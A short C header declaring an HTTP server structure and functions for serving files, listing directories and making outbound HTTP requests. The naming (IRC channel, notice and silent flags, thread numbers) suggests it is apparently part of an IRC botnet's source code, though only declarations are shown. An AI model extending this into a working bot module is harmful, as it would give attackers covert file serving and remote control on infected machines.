#ifndef NO_HTTPD
typedef struct HTTPD 
{
	SOCKET sock;
	char chan[128];
	char file[MAX_PATH];
	char path[MAX_PATH];
	char dir[MAX_PATH];
	unsigned short port;
	int length;
	int threadnum;
	bool notice;
	bool silent;
	bool enabled;
	bool type;
	bool info;

} HTTPD;

DWORD WINAPI HTTP_Server_Thread(LPVOID param);
int Check_Requested_File(SOCKET sock, char *dir, char *rFile, bool dirinfo, int threadnum);
int GetFiles(char *current, SOCKET sock, char *chan, char *URL);
DWORD WINAPI HTTP_Header(LPVOID param);
void HTTP_Send_File(SOCKET sock, char *file);
char *File_To_HTML(char *file);
void HTTP_Connect(SOCKET sock, char *chan, bool notice, bool silent, char *host, int port, char *method, char *url, char *referer);
#endif